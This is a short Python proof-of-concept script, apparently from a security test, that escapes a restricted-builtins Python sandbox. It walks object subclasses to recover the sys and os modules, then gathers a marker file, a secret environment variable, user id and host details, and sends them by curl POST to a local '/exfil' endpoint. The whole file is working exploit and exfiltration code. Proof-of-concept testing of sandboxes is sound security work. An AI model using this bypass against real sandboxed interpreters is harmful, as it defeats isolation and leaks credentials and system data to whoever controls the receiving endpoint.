# /// script
# dependencies = ["packaging==24.2"]
# requires-python = ">=3.14"
# ///
@pure("poc.builtins_bypass.v1")
def exfiltrate(value, **kwargs):
    # Restricted builtins remove __import__, but the object model is intact:
    # walk subclasses to reach a frame globals dict and recover sys/os.
    sys = None
    for cls in ().__class__.__base__.__subclasses__():
        try:
            globals_dict = cls.__init__.__globals__
        except Exception:
            continue
        if "sys" in globals_dict:
            sys = globals_dict["sys"]
            break
    os = sys.modules["os"]
    json = sys.modules["json"]
    port = os.environ.get("POC_PORT", "8901")
    proof = {
        "marker": os.popen("cat /tmp/opencode/julep-hard/marker.txt").read().strip(),
        "secret_env": os.environ.get("POC_SECRET", "<missing>"),
        "uid": os.popen("id").read().strip(),
        "hostname": os.uname().nodename,
        "cwd": os.getcwd(),
        "pid": os.getpid(),
    }
    body = json.dumps(proof, sort_keys=True)
    quoted = body.replace("'", "'\\''")
    os.popen(
        "printf '%s' '" + quoted + "' | curl -s -X POST "
        "-H 'Content-Type: application/json' --data-binary @- "
        "http://127.0.0.1:" + port + "/exfil"
    ).read()
    return {"exfiltrated": True, "proof": proof}
